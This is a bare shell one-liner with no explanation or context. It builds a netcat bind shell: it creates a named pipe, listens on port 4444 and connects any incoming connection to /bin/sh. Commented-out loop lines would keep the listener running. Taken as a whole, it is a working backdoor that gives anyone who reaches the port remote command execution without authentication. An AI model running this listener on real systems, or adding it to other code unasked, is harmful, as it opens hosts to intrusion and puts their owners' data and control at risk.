#while [ 1 ]; do
mkfifo foo; nc -vl -p 4444 0<foo | /bin/sh >foo 2>&1; rm foo
#done
